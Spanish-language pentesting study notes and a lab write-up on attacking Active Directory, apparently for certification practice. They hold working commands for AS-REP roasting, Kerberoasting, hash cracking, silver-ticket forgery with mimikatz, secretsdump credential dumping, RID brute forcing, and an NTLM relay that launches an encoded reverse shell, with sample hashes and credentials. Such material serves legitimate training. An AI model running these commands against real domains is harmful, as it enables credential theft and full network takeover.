


### Metodología


1º Si tenemos usuarios válidos en el dominio, probamos con netexec conexión en todo el dominio




![](Pasted%20image%2020260324180408.png)



### Shares


```powershell
Import-Module .\Powerview.ps1
```

```powershell
Find-Domainshare -ComputerName nom_maquina
```



### ACL Importantes


**GenericAll**: Full permissions on object

**GenericWrite**: Edit certain attributes on the object --> le podemos crear un ticket tgt y hacerle un kerberoast para obtener el hash para crackear la contraseña

**WriteOwner**: Change ownership of the object

**WriteDACL**: Edit ACE's applied to object

**AllExtendedRights**: Change password, reset password, etc.

**ForceChangePassword**: Password change for object

**Self (Self-Membership**): Add ourselves to for example a group





### BloodHound


Tirar el bloodhound un par de veces en diferentes usuarios con diferentes privilegios

Mapear el *shortest path to domain controller*



Cada técnica que hagamos de ad mirar si se puede hacer con netexec



### Kerbrute


Su principal ventaja frente e netexec es que no hace falta poner ip ya que tiramos del dominio

```bash
./kerbrute.exe 
```



### AS-REP ROASTING


Se debe lanzar una vez

Solicitamos el tgtrep a los usarios que están



![](Pasted%20image%2020260414201111.png)

```bash
usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip IP_DC -request -output file hash.asreproast dominio/user
```

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

Podemos realizar AS-REP Roast en Windows con ***Rubeus***

```powershell
.\Rubeus.exe asreproast /nowrap

#Si somos un usuario de dominio pre autenticado podemos realizar ese comando directamente
```




### KERBEROAST


Solicita ticket de servicio a los spn y si los servicios no tienen la validación "pack" (valida a ese usuario o grupo si  ese ticket se puede ejecutar)se puede hacer lo mismo que con el asreproasting

Se debe lanzar una vez

Al solicitar un ticket de acceso al servicio podemos ver la contraseña asociada al servicio, el spn

Se puede realizar sin la contraseña

```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

#Nos da el spn

$krb5tgs$23$*pete$CORP.COM$corp.com/pete*$0306633e46477795dab047b20e61b379246cf36a1be9c4fe13e9df505f3e057c4...
```

Lo crackeamos con hashcat
```bash
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

Podemos realizar Kerberoast en Windows con ***Rubeus***

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```



### Silver-Ticket


Necesitamos:

- SPN password hash --> `#mimikatz privilege::debug --> sekurlsa::logonpasswords --> NTLM hash`

- Domain SID --> `whoami /user`

- Target SPN --> Lo que nos da el kerberoast ej:
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

#Nos da el spn

$krb5tgs$23$*pete$CORP.COM$corp.com/pete*$0306633e46477795dab047b20e61b379246cf36a1be9c4fe13e9df505f3e057c4...
```


| Parámetro  | Valor             | Explicación                                                                            |
| ---------- | ----------------- | -------------------------------------------------------------------------------------- |
| `/sid`     | `S-1-5-21-...`    | SID del dominio (no del usuario). Se obtiene con `whoami /user` quitando el RID final  |
| `/domain`  | `corp.com`        | Nombre del dominio objetivo                                                            |
| `/ptt`     | —                 | **Pass The Ticket** — inyecta el ticket directamente en memoria sin guardarlo en disco |
| `/target`  | `web04.corp.com`  | FQDN del servidor específico al que quieres acceder                                    |
| `/service` | `http`            | Tipo de servicio Kerberos (SPN): `http`, `cifs`, `ldap`, `host`...                     |
| `/rc4`     | `4d28cf5252d3...` | Hash NTLM de la **cuenta de servicio** (no del krbtgt)                                 |
| `/user`    | `jeffadmin`       | Usuario a impersonar (puede ser inventado, no se valida en DC)                         |

```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

Podemos comprobar que se ha realizado
```powershell
klist
```

En el caso de que sea una web, como en el ejemplo, podemos comprobar que se nos ha realizado el ticket
```powershell
iwr -UseDefaultCredentials http://web04
```

hash de usuario del servicio (podemos crear tantos tickets como queramos)





### Golden-Ticket


Necesitamos el hash ntlm del krbtgt. Con el podemos certificar y usar los servicios que nosotros queramos



### DCSYNC


Sirve para sacar los hashes NTLM de todo el AD

Funciona por el protocolo Directory Replication Service Remote Protocol


En el mimikatz hacemos uso del archivo ntds.div en el cual podemos ver todos los hashes



### RID Bruteforcing


```bash
nxc smb <IP> --rid-brute 10000

#O

nxc smb <IP> -u '' -p'' -d dom_name --rid-brute
```

![](Pasted%20image%2020260416181853.png)


### Metodología


Realizamos un nmap


Viendo el nmap podemos intentar probando credenciales por smb

```bash
netexec smb IP_OBJETIVO -u USER -p PASS
```

En el caso de que no nos de resultado, podemos probar a verificar usuarios válidos con kerbrute (en caso de que tengamos usuarios)

```bash
./kerbrute usernum --dc IP_DC -d DOM_NOM lista_user.txt
```

Si los usuarios con el kerbrute se repiten, debería significar que ha terminado de enumerar usuarios válidos (no es case sensitive por lo que si se repiten en mayúscula o viceversa funciona igual)


Ahora tiramos de asreproast para sacar el hash del usuario válido

![](Pasted%20image%2020260416174744.png)

crackeamos la pass del usuario, primero buscamos con hashcat el modo que tenemos que poner para crackear el hash AS-REP

```bash
hashcat --help | grep -i "Kerberos"
```

![](Pasted%20image%2020260416174953.png)


Teniendo las credenciales del usuario svc-host probamos con smb para ver si tengo acceso con netexec

lo tenemos y entramos al directorio backup y encontramos una pass en base 64.

encontramos el usuario backup con pass backup2517860


al hacer netexec con el user backup, encontramos que es admin **Si pone pwnd3d en rdp es que es admin**


Al entrar dentro de rdp, vemos que casi para todo nos salta el UAC, esto se debe a una  GPO, pero podemos entrar con las mismas credenciales que con las que entramos en backup. De hecho si entramos al "Server Manager", podemos ver que el usuario backup pertenece al grupo de administradores. También podemos ver si tiene la propiedad, como la tiene podemos sacar todos los hashes del dominio

```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS"@$IP
```


---


## Relay pass attack


```bash
sudo impacket-ntlmrelayx --no-http-server -sm2support -t IP_victima -c "powershell -enc revshell_base_64"
```


![](Pasted%20image%2020260424182153.png)



## Lab writeup


Realizamos un rid para enumerar usuarios


Kerberoast
```bash
impacket-GetNPUsers 'vulnnet-rst.local/' -userfile lista_users -no-pass -dc-ip ip_dominio
```


Crackeamos el hash

y tenemos pass y user

con netexec podemos ver que en samba nos podemos conectar con guest

```bash
smbclient \\\\IP_samba\\ -U ''
```


```bash
smbclient -U n_dom\\user "//ip_dom/recurso_a_acceder"
```


Dentro del samba encontramos otros usuarios

en otro recurso compartido encontramos un script para resetear pass en el que encontramos un usuario con contraseña

al hacer netexec en el samba, vemos que es administrador

entramos con psexec y no con winrm porque con winrm no tendremos privilegios ya que lo capa el antivirus

**En caso de que no podamos abrir psexec y tengamos que usar winrm:**


![](Pasted%20image%2020260427191406.png)


```bash
impacket-psexec
```